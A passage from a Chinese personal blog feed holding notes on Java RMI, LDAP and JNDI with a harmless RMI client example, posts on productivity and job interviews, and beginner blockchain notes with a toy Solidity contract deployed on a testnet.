客户端获取指定服务器和远程对象的名字</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment">* <span class="doctag">@date</span> 2019年8月25日  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@version</span> V1.0  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@ClassName</span>: WarehouseClient  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 客户端实现远程调用方法</span></span><br><span class="line"><span class="comment">*    </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarehouseClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Title</span>: main  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: TODO</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> args </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NamingException </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获得指定主机和指定端口上的注册表对象</span></span><br><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">8888</span>);</span><br><span class="line"><span class="comment">//Returns a reference to the remote object Registry on the specified host and port.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回的是Remote接口类型，这里进行一个向下的转型</span></span><br><span class="line">Warehouse centralWarehouse = (Warehouse) registry.lookup(<span class="string">&quot;central_warehouse&quot;</span>);</span><br><span class="line">String descr = <span class="string">&quot;Toaster&quot;</span>;</span><br><span class="line"><span class="keyword">double</span> price = centralWarehouse.getPrice(descr);</span><br><span class="line">System.out.println(descr + <span class="string">&quot;: &quot;</span> + price);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>使用 WarehouseClient.java 的运行结果：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210401143757.png"><br>成功调用 getPrice 方法获取到 24.5。</li></ol><p>下面给出RMI工作的流程图:<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210401143901.png"></p><ul><li>服务器：将实例化后的对象绑定在注册表中，并等待客户端的调用。</li><li>客户端：使用lookup方法获取对象的引用，<strong>客户端所得到的结果实际上是在服务端那里执行完成的，服务端只是将这个结果返回给了请求者</strong>。<blockquote><p>疑问🤔️：那恶意代码挂载在自己服务器，是怎么反弹shell的呢？迷惑</p></blockquote></li></ul><h2 id="0x02-LDAP-是什么？"><a href="#0x02-LDAP-是什么？" class="headerlink" title="0x02 LDAP 是什么？"></a>0x02 LDAP 是什么？</h2><p>LDAP 是 <a href="https://baike.baidu.com/item/%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE">轻量目录访问协议</a>，英文全称是 Lightweight Directory Access Protocol。简单来说， 是一个为查询、浏览和搜索而优化的专业分布式数据库，它成树状结构组织数据，就好像 Linux/Unix 系统中的文件目录一样。</p><p>LDAP以树结构标识所以不能像表格一样用SQL语句查询，它“读”性能很强，但“写”性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p><p>LDAP可以绑定对象，实现远程方法调用。</p><h2 id="0x03-RMI-和-LDAP-的区别和联系"><a href="#0x03-RMI-和-LDAP-的区别和联系" class="headerlink" title="0x03 RMI 和 LDAP 的区别和联系"></a>0x03 RMI 和 LDAP 的区别和联系</h2><p>在使用 marshalsec 时，需要选择不同的协议 RMI 或 LDAP，但是又不太理解这两种方法的区别。这里摘录一下其他大佬博客对于这个的理解：<a href="https://lzwgiter.github.io/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5(%E4%B8%8A)/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%92%8CRMI">传送门</a></p><blockquote><p>简单来说的话，大家应该都清楚RPC(Remote Procedure Call)的作用，RMI相当于就是Java版本的RPC，可以实现远程对一个实例化的对象的使用；而JNDI的作用提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA等。在Java中为了能够更方便的管理、访问和调用远程的资源对象，常常会使用 LDAP和RMI等服务来将资源对象或方法绑定在固定的远程服务端，供应用程序来进行访问和调用。</p></blockquote><p>简而言之，LDAP和RMI都可以绑定对象，进而实现远程方法调用。</p><h2 id="0x04-RMP-是什么？"><a href="#0x04-RMP-是什么？" class="headerlink" title="0x04 RMP 是什么？"></a>0x04 RMP 是什么？</h2><h2 id="0x05-JDNI-是什么？"><a href="#0x05-JDNI-是什么？" class="headerlink" title="0x05 JDNI 是什么？"></a>0x05 JDNI 是什么？</h2><p>JNDI即Java Naming and Directory Interface，就是一组在Java应用中访问命名与服务的API。为开发人员查找和访问资源提供了统一的通用接口，可以用来定位网络 机器 用户 对象等各种资源。JNDI底层提供了很多实现方式，有RMI LDAP CORBA等，这些服务器注册的服务可以通过JNDI提供的一个统一外部接口去访问调用。</p><ul><li>Java Naming：键值对的绑定，应用程序可通过键检索值</li><li>Java Directory：是对Java Naming的补充扩张。差别为Java Directory可以根据属性搜索对象。在目录服务中，JNDI允许访问文件系统中的文件，绑定在RMI服务器的对象，LDAP服务与其他组件。</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210401125932.png"></p><p>JNDI将名字与对象绑定，可以通过名字检索存储在RMI、LDAP服务器上的对象，所以提供了绑定与检索方法。</p><p>JNDI与RMI的关系可以理解为，JDBC和MySQL Driver的关系。</p><h2 id="0x07-SPI是什么？"><a href="#0x07-SPI是什么？" class="headerlink" title="0x07 SPI是什么？"></a>0x07 SPI是什么？</h2><p>SPI是Service Provider Interface的缩写，是JDK内置的服务发现协议。</p><p>SPI是一种动态替换发现的机制， 比如有个接口，想运行时动态的给它添加实现，你只需要添加一个实现。我们经常遇到的就是java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，mysql和postgresql都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻找服务实现。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210401131153.png"></p><p>也就是一种典型的面向接口编程，让程序的鲁棒性和可拓展性更高。</p><p>问题6中的JDNI SPI也就是一个接口，可以连接LDAP和RMI等服务。</p><h2 id="0x06-为什么-Java-反序列化时和上面的各种协议紧密关联？"><a href="#0x06-为什么-Java-反序列化时和上面的各种协议紧密关联？" class="headerlink" title="0x06 为什么 Java 反序列化时和上面的各种协议紧密关联？"></a>0x06 为什么 Java 反序列化时和上面的各种协议紧密关联？</h2><h2 id="0x04-marshalsec-的原理是什么？"><a href="#0x04-marshalsec-的原理是什么？" class="headerlink" title="0x04 marshalsec 的原理是什么？"></a>0x04 marshalsec 的原理是什么？</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="附录"><a href="#附录" class="headerlink" title="#附录"></a>#附录</h1><p>参考教程：</p><ol><li>Java RMI远程方法调用详解：<a href="https://blog.csdn.net/guyuealian/article/details/51992182">https://blog.csdn.net/guyuealian/article/details/51992182</a></li><li>总结：详解RMI与RPC的区别：<a href="https://zhuanlan.zhihu.com/p/50678735">https://zhuanlan.zhihu.com/p/50678735</a></li><li>RMI实现RPC：<a href="https://blog.csdn.net/u014565127/article/details/113583536">https://blog.csdn.net/u014565127/article/details/113583536</a></li><li>java ldap：<a href="https://blog.csdn.net/bobbykey/article/details/88966040">https://blog.csdn.net/bobbykey/article/details/88966040</a></li><li>系统工具 | LDAP 使用教程篇：<a href="https://aiden-dong.github.io/2019/05/08/Ldap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">https://aiden-dong.github.io/2019/05/08/Ldap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</a></li><li>Java教程 - 廖雪峰的官方网站：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744">https://www.liaoxuefeng.com/wiki/1252599548343744</a></li><li>Java 反序列化漏洞与JNDI注入(上)：<a href="https://lzwgiter.github.io/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5(%E4%B8%8A)/">https://lzwgiter.github.io/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5(%E4%B8%8A)/</a></li><li>【原创】（译）Java 序列化魔法方法及使用示例：<a href="https://juejin.cn/post/6844903936672038920#heading-0">https://juejin.cn/post/6844903936672038920#heading-0</a></li><li>Jedis存储Java对象–Java序列化为byte数组方式：<a href="https://www.cnblogs.com/linjiqin/archive/2013/05/29/3105608.html">https://www.cnblogs.com/linjiqin/archive/2013/05/29/3105608.html</a></li><li>Java基础：IO流之字节流和字符流：<a href="https://blog.csdn.net/axi295309066/article/details/52820203">https://blog.csdn.net/axi295309066/article/details/52820203</a></li><li>你真的会用Java io流吗？：<a href="https://www.javazhiyin.com/46874.html">https://www.javazhiyin.com/46874.html</a></li><li>JNDI注入入门：<a href="https://p0rz9.github.io/2019/05/05/JNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/">https://p0rz9.github.io/2019/05/05/JNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/</a></li><li>java中extends和implements的区别，怎么用？：<a href="https://my.oschina.net/yongqingfan/blog/531166">https://my.oschina.net/yongqingfan/blog/531166</a></li><li>java远程调用之RMI（终于可以自己写代码控制别人电脑了）：<a href="https://zhuanlan.zhihu.com/p/80686193">https://zhuanlan.zhihu.com/p/80686193</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验分享】效率提升总结</title>
      <link href="3aae222bb2c3/"/>
      <url>3aae222bb2c3/</url>
      
        <content type="html"><![CDATA[<p>决定将《左耳听风-极客时间》中的「时间规划」方面的分享应用到自己的实际生活当中，并且记录自己的实践经历。</p><p>基本思想：反转控制，被动变主动。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210324113219.png"></p><h1 id="1-如何做"><a href="#1-如何做" class="headerlink" title="1 如何做"></a>1 如何做</h1><p>假设有一些必须要完成的任务，需要高效率的完成，就需要考虑下面的问题：</p><ol><li>哪件事最紧急？</li><li>如何保证自己的专注？</li><li>如何保护专注状态的持久？<blockquote><p>目标：专注的做一件事。<br>需要解决的问题：被外界打扰、自己思绪打扰。</p></blockquote></li></ol><h2 id="0x01-如何确定目前最应该做的事？"><a href="#0x01-如何确定目前最应该做的事？" class="headerlink" title="0x01 如何确定目前最应该做的事？"></a>0x01 如何确定目前最应该做的事？</h2><ul><li>行程：平时在滴答清单中，将行程和行程信息进行记录，在行程前进行提醒，保证自己不会错过最重要的事情。及时对行程进行准备，让重要的事情做得更好。</li><li>焦虑：解决自己的焦虑。</li><li>兴趣：可以随性一点。</li></ul><h2 id="0x02-如何保证自己注意力集中？"><a href="#0x02-如何保证自己注意力集中？" class="headerlink" title="0x02 如何保证自己注意力集中？"></a>0x02 如何保证自己注意力集中？</h2><p>在确定当前需要做的事情之后,保持注意力集中是提升个人效率的关键：</p><ol><li>将问题进行分解之后，记录进入滴答清单。</li><li>选取 45 分钟能完成的任务。</li><li>45 分钟专注解决分解后的任务。</li><li>如果刚刚给自己安排的任务完成，回到第 2 步。如果给自己安排的任务不能完成，回到第 3 步。<blockquote><p>尽量保证自己大脑保持活跃。</p></blockquote></li></ol><h2 id="0x03-如何屏蔽干扰？"><a href="#0x03-如何屏蔽干扰？" class="headerlink" title="0x03 如何屏蔽干扰？"></a>0x03 如何屏蔽干扰？</h2><p>外界干扰：</p><ol><li>给周边的人一些信息，表明自己目前不愿意被打扰。</li><li>有人来打扰时，询问紧急程度，然后进行一定的规划。</li><li>使用耳塞。</li></ol><p>思想干扰：</p><ol><li>如果突然想到某件事<ol><li>重要。考虑切换任务</li><li>不重要。记录下来，等番茄时钟的完成后再解决。</li></ol></li></ol><h1 id="2-如何做得更好"><a href="#2-如何做得更好" class="headerlink" title="2 如何做得更好"></a>2 如何做得更好</h1><p>当使用 1 中的策略，可以高效的完成一件事时。就需要进一步考虑下面的问题：（核心思想：反转控制，化被动为主动）</p><ol><li>如何为自己挤时间？（提高自己）</li><li>哪些事情更重要？（把握重点）</li></ol><blockquote><p>目标：尽量保证自己做的事情有价值，事情能给自己带来较好的反馈。<br>note：反馈对于一个人的进步至关重要。</p></blockquote><h2 id="0x01-如何为自己挤时间？"><a href="#0x01-如何为自己挤时间？" class="headerlink" title="0x01 如何为自己挤时间？"></a>0x01 如何为自己挤时间？</h2><p>首先当拿到某个任务或者问题之后。先思考任务的前因后果，以及任务的必要性。如果去做没必要做的事情，就是浪费时间。</p><blockquote><p>学会说“不”：<br>a. 我可以加班加点完成，但是我不保证好的质量，有 bug 你得认，而且事后你要给我 1 个月的时间还债。<br>b. 我可以加班加点，还能保证质量，但我没办法完成这么多需求，能不能减少一些？<br>c. 我可以保质保量地完成所有的需求，但是，能不能多给我 2 周时间？</p></blockquote><p>此次，当任务的必要性确定后，可以进一步确定任务的复杂度，确定时间的复杂度。（小任务优先，容易得到反馈）</p><p>再其次，拆分任务，然后专注的完成这项任务。</p><h2 id="0x02-如何利用好自己的时间？"><a href="#0x02-如何利用好自己的时间？" class="headerlink" title="0x02 如何利用好自己的时间？"></a>0x02 如何利用好自己的时间？</h2><p>时间就像金钱一样，你得学会投资时间，把时间投资在有价值有意义的地方，你就会有“更多的时间”。</p><ul><li><strong>花时间学习基础知识，花时间读文档</strong>。系统地学习一门技术是非常关键的，所以这个时间是值得投资的。</li><li><strong>花时间在解放自己生产力的事上。</strong></li><li><strong>花时间在让自己成长的事上</strong>。把时间花在能让自己成长，能让自己有更强的竞争力，能让自己有更大的视野，能让自己有更多可能性的事情上。这样的时间投资才是有价值的。</li><li><strong>花时间在建立高效的环境上</strong>。</li><li><strong>花些时间在影响你身边的人上</strong>。</li></ul><blockquote><p>总体思想：关注长期利益规划。要多关注长远可以节省多少时间，而不是当前会花费多少时间。长期成本会比短期成本大得多。所以，宁可在短期延期，也不要透支未来。这里的逻辑是，工作上的事你永远也做不完的，长痛不如短痛。</p></blockquote><h1 id="3-聚沙成塔"><a href="#3-聚沙成塔" class="headerlink" title="3 聚沙成塔"></a>3 聚沙成塔</h1><p>前面 2 个小结的目标分别是“学会做有价值的事”、“学会做好有价值的事”，接下来这一节的目标则是：学会实现自己的目标。</p><h2 id="0x01-如何规划自己的行动？"><a href="#0x01-如何规划自己的行动？" class="headerlink" title="0x01 如何规划自己的行动？"></a>0x01 如何规划自己的行动？</h2><p>规划自己的行动计划，不是短期的，而是一个中长期的。</p><p>个人建议是按季度来规划，这个季度做什么，达到什么目标，一年往前走四步，而不是只考虑眼下。</p><h2 id="0x02-有哪些实践时需要注意的事项？"><a href="#0x02-有哪些实践时需要注意的事项？" class="headerlink" title="0x02 有哪些实践时需要注意的事项？"></a>0x02 有哪些实践时需要注意的事项？</h2><ol><li><strong>形成习惯</strong>。再好的方法，如果没有形成习惯，不能在实际的工作和生活中解决实际问题，都将成为空谈。形成习惯是实现目标的基石，三天打鱼两天晒网的生活难以实现目标。<strong>要有正反馈，也就是成就感，有助于完成一些看似难以完成的事儿。</strong></li><li><strong>将军赶路不追小兔</strong>。这个世界有太多的东西会让我们分心和跑偏。能专注地把时间投入到一个有价值的事上是非常重要的。<strong>确定自己的目标，专注达到这个目标，而不是分心</strong>。将军的目标是要攻城，而不是追兔子。</li><li><strong>反思和举一反三</strong>。可以尝试每周末花上点时间思考一下，本周做了哪些事儿？时间安排是否合理？还有哪些可以优化提高的地方？有点儿类似于我们常说的“复盘”。然后思考一下，下周的主要任务是什么？并根据优先级规划一下完成这些任务的顺序，也就是做一些下周的工作规划。</li></ol><h1 id="4-实践"><a href="#4-实践" class="headerlink" title="4 实践"></a>4 实践</h1><p>前面的种种思想都是摘录了《左耳听风-极客时间》中的思想，并没有进行实践。最后一个小结，将记录自己的实践过程中遇到的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 时间规划 </tag>
            
            <tag> 效率提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验分享】面试总结</title>
      <link href="23f0f03d99ed/"/>
      <url>23f0f03d99ed/</url>
      
        <content type="html"><![CDATA[<p>以下是我的面试经历，我对于面试的看法，和我对于某些现象的看法。</p><hr><h2 id="0x01-常见的面试过程是怎样的？"><a href="#0x01-常见的面试过程是怎样的？" class="headerlink" title="0x01 常见的面试过程是怎样的？"></a>0x01 常见的面试过程是怎样的？</h2><p>我在这里转载以下「CoolShell」的一段话，我觉得讲得非常真实。<a href="https://coolshell.cn/articles/1870.html">传送门</a></p><p>对于传统的面试招聘过程，基本上来说都是下面这样的样子的：</p><ul><li>阅读应聘者的简历，让应聘者做个自我介绍。</li><li>问一些比较难的非常细节的技术问题，以一问一答的形式。</li><li>给面试者一些和几个编程难题。（比如某些怪异的算法题）</li></ul><p>我个人觉得这种面试方法很可笑，也很糟糕，尤其是后面两点。通常来说，这样的面试只会让你面试到一些“书呆子”或是一些“技术痴迷者”，下面让我来一条一条地剖析一下这几条的弊端。</p><p>你很难从一个人的简历或是自我介绍上了解一个人。因为这些都是当事人自己写的，或是自己阐述的。所以，这并不是很准确的，通过简历，你只能知道很简单的事情，这对于是否能招入团是远远不够的。而在面试的开始，让应聘者做自我介绍，只会让面试者以很正式的态度来面对整个面试。一但面试过程很正式，很严肃，就会让人很拘禁，其实，这并不是我们想要的，我要的是应聘者真实和自然的表现，从而才能了解到最真实的东西。</p><p>问几个技术细节的问题。比如：<strong>我个人经历过的——“ps的-a参数是什么意思？”，“vi中删除换行符的命令是什么？”，“C++的关键字explict,mutable是用来干什么？</strong>”等等，等等。以前做为一个应聘者来说，我非常讨厌这样的问题，<strong>因为这样的问题查一下手册就知道。难道他要招的是一个字典手册？</strong> 不是一个人？对于这方面，重要的不是知识，重要的是其查找知识的能力。</p><p>给应聘者一个或几个很难的算法题，给上十几分钟，然后让面试者把伪代码或是代码写下来。<strong>这样的做法是相当可笑的，不能讨论不能查资料，让人在一种压力状态下作答，这根本就不是实际工作中的状态，而我们的面试也就成了一种刁难（我最变态的经历是，当我把写在两页纸上的代码上交上去后，面试官把其交给旁边程序员输出电脑做校验，结果程序员说，编译出错。于是，面试官说，“很遗憾，可能你写的程序还不多”，相当可笑）</strong>。对于这点来说，重要的不是那个解题的答案，而是解题的思路和方法。</p><p>我以前经历过很多的面试，当技术人员来和我做面试的时候，我发现，“技术人员的思维”对于某些人来说根本分不清面试和考试，在潜意识里，他们在很多时候不是在面试这个人，而是在刁难这个人并以此展示自己的技能。<strong>我个人认为我是一个好的程序员，但我可以告诉你我无法通过那样的面试，因为那样的面试是为他们自己准备的，而不是为应聘者准备的。</strong></p><hr><h2 id="0x02-应该怎么看待面试？"><a href="#0x02-应该怎么看待面试？" class="headerlink" title="0x02 应该怎么看待面试？"></a>0x02 应该怎么看待面试？</h2><p>我最初的想法也是和 CoolShell 作者一样：</p><blockquote><p>他并不是在考察我的能力，很多问题只需要在搜索引擎搜索一下即可解决的问题。</p></blockquote><p>但我后面突然想到了「高考」，为什么会有高考的存在？面试不正是类似高考的存在吗？所以我现在的想法是：</p><blockquote><p>老老实实背题，并且最好能讲出你自己独到的见解，如果你背题也挤不进大厂，就真的只是能力问题，只能说明我是不过如此的男人。</p></blockquote><p>如果想要体现你的能力，那就用成果来证明。例如张小龙面试就只需要一句话，我做了微信。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】区块链安全总结</title>
      <link href="8e9449344a04/"/>
      <url>8e9449344a04/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>在我看来，网络安全最关键的几个用途：</p><ul><li>金融保护：保护资金安全和交易时的安全。</li><li>网站或应用保护：保护网站的安全，是金融保护的基础，但是和金融保护关联性不大。<ul><li>Web：网站。</li><li>Pwn：应用和底层。</li></ul></li><li>隐私保护：主要是信息的保护。<ul><li>关键数据：公司机密等信息。</li><li>个人隐私：个人隐私数据。</li></ul></li></ul><p>数字货币是未来的趋势，势必需要达到一定的安全系数，才能应用与实际场景。这篇文章将会记录我学习其中的区块链安全的所有笔记。</p><hr><h1 id="1-基础"><a href="#1-基础" class="headerlink" title="1 基础"></a>1 基础</h1><p><font color="red">0x01：区块链是什么？比特币是什么？区块链和比特币是什么关系？</font></p><ul><li>区块链其实是一种数据结构，堆和栈就是一种数据结构，可以被用来构建分布式数据库。</li><li>比特币是一种数字货币（money）。</li></ul><p>比特币是基于「区块链」这种数据结构制作的货币。</p><hr><p><font color="red">0x02：比特币为什么那么火？</font></p><p>这是我从普通人视角看到的好处：</p><ol><li>去中心化：最直接的好处，防止可信任机构（货币发行者）做出失信行为。例如：金圆券。</li><li>全球流通：免中间手续费。</li><li>匿名：软件勒索必选货币，或者各种黑市交易。</li></ol><p>比特币的本质：解决信任问题，降低信任的成本（一堆人证明）。简而言之，减少中间商转差价（银行等金融机构）。</p><p><font color="red">0x03：区块链的结构是怎样的？</font></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210315214257.png"><br>（可以先有个抽象的概念）</p><ol><li>区块：区块是存储交易信息的数据结构（包含区块头、区块体），其中区块头用于存储特征值，而区块体用于存储实际数据。每次交易都会产生一个区块，第一个区块被成为“创世区块”，前一个区块称为后一个区块的父区块。</li><li>链：每个区块头都有上一个区块头的 Hash 值，在逻辑上就像是相连着一样。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316002023.png"><blockquote><p>注意：“每次交易”是指在区块生成这段时间。一个区块体能包含 2000 多笔交易。</p></blockquote></li></ol><hr><p><font color="red">0x04：挖矿是什么？</font></p><p>挖矿就是记录区块头 Hash 值生成下一个区块的过程。</p><p>不过并没有那么简单，中本聪的发明者故意让区块的生成非常的困难，区块的哈希值需要小于目标值才会被接受。在区块头大部分都是特征值，但其中有一个 <code>nonce</code> 的属性，可以用于修改，使得区块头生成的哈希小于目标值。</p><p>这个目标值还具有动态调节功能，当前两周区块的平均生成时间小于 10 分钟，会将目标值降低，使得挖矿难度更难。</p><blockquote><p>感觉挖矿有些浪费资源，不过确实是极大的保证了区块链的安全性。</p></blockquote><hr><p><font color="red">0x05：比特币是怎么交易的？</font></p><p>比特币钱包就是一对公钥和私钥，钱包的地址就是公钥指纹（公钥的哈希值）。最初的账户的金额都是 0，你需要通过其他渠道获取，让别人支付给你比特币。</p><p>别人只需要支付到你的钱包地址即可，如果支付方确认支付，所有的矿工将会记录下这笔交易，也就是意味着整个系统都承认你有xx枚比特币，整个系统都知道支付方少了xx枚比特币。</p><p>当你需要向别人支付时，系统就需要进行验证：</p><ul><li>你的钱包地址有多少钱？从哪来的？</li><li>你给出的公钥是不是当前钱包地址的公钥？（钱包的地址==Hash(公钥)）</li><li>你是否是这个钱包的主人？（你使用私钥生成的数字签名，使用公钥是否能揭开）<blockquote><p>通过了上面的验证，系统就会认为你是这个钱包的主人，然后将钱包地址上的钱转给他人。</p></blockquote></li></ul><p>这里引用阮一峰老师的一段话：</p><blockquote><p>比特币不存放在钱包或其他别的地方，而是只存在于区块链上面。区块链记载了你参与的每一笔交易，你得到过多少比特币，你又支付了多少比特币，因此可以算出来你拥有多少资产。</p></blockquote><p>还可以考虑采用麻将来比喻区块链（每次并不支付筹码，只是做数字的运算）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316012028.png"></p><hr><p><font color="red">0x06 以太坊和比特币有什么相同点和不同点呢？</font></p><p>在网站 CoinMarketCap 中列出了所有的加密货币。 <a href="https://coinmarketcap.com/zh/all/views/all/">传送门</a></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316093958.png"><br>（图片说明：所有加密货币中排行前三的货币，能看出比特币和以太坊远超第二名）</p><p>相同点：</p><ol><li>都基于区块链技术构建。</li><li>都采用公钥体系来认证交易。</li></ol><p>不同点：</p><ol><li>作用<ol><li>比特币：交易货币。</li><li>以太坊：是一个开源的有智能合约功能的公共区块链平台，以太坊可以充当其他加密货币的平台，以「以太坊」为平台的「以太币」交易的区块确认时间更短。</li></ol></li><li>智能合约：使用代码编写的交易规则，具有广泛的使用场景。<ol><li>区块链：不具有智能合约</li><li>以太坊：具有智能合约，能处理更复杂的问题，该系统能够制定基本规则并强制执行合约，这是在实际合约和没有中间人的情况下是不可能发生的。</li></ol></li></ol><blockquote><p>智能合约的使用场景：<br>1.具有嵌入式指令的银行账户：类似银行的自动扣费，不过需要自己进行编写。</p><ul><li>资金控制权：银行是银行账户的最终维护者，它拥有完全的控制权，可以随意地向我的账户添加资金或者扣除资金，或者冻结资金</li><li>透明性：逻辑代码在所有参与的计算机上并行运行，结果由所有参与者进行比对。只有当参与者都同意结果，他们才会更新自己的账本版本。理论上没有人可以欺骗区块链。</li></ul><p>2.用计算机代码取代法律术语：严格的，没有争议。</p><ul><li>共享账本将在消除多方协议之间的信任需求方面发挥作用。比如：租赁合同。</li></ul></blockquote><p>在我看来比特币和智能合约都解决了信任问题，极大的降低了信任成本。</p><ul><li>比特币：将货币数字化去中心化，解决了简单的交易问题（不能解决复杂的条款）。</li><li>智能合约：将合约数字化，还可利用区块链的信任体系来减少对于中间人的依赖</li></ul><hr><p><font color="red">0x07 如何编写并运行自己的智能合约？</font></p><blockquote><p>具体教程参考：<a href="https://www.cnblogs.com/KRDecad3/p/10798383.html">传送门</a></p></blockquote><p>大概步骤：（只记录关键部分）</p><ol><li><strong>拥有自己的加密货币</strong>。ETH除了主网络，还有很多测试网络，可以在测试网络中免费获得。<blockquote><p>我最初认为需要花钱购买，Too young too simple.<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316114236.png"><br>（图片说明：我在 Ropsten 测试网络的测试水龙头中获得了 2 个 ETH 币）</p></blockquote></li><li><strong>部署智能合约</strong>。</li></ol><p>在网站 <a href="http://remix.ethereum.org/">http://remix.ethereum.org/</a> 中进行网站的部署。<br>测试代码如下：（教程中的代码有不明的符号……）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) balances;</span><br><span class="line">  </span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    balances[tx.origin] &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  event FLAG(string b64email, string slogan);</span><br><span class="line">  </span><br><span class="line">  function getbalance() public constant returns (uint)&#123;</span><br><span class="line">      return balances[tx.origin];</span><br><span class="line">  &#125;</span><br><span class="line">  function AddBalance(uint f) public &#123;</span><br><span class="line">    if(f&#x3D;&#x3D;1)&#123;</span><br><span class="line">        balances[tx.origin]++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function CaptureTheFlag(string b64email) public&#123;</span><br><span class="line">    require (balances[tx.origin]&gt;0);</span><br><span class="line">    emit FLAG(b64email, &quot;you will get flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>部署完成的效果图：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210316115804.png"><br>（图片说明：在 MetaMask 中的活动一栏可以看到合约的部署情况）</p><ol 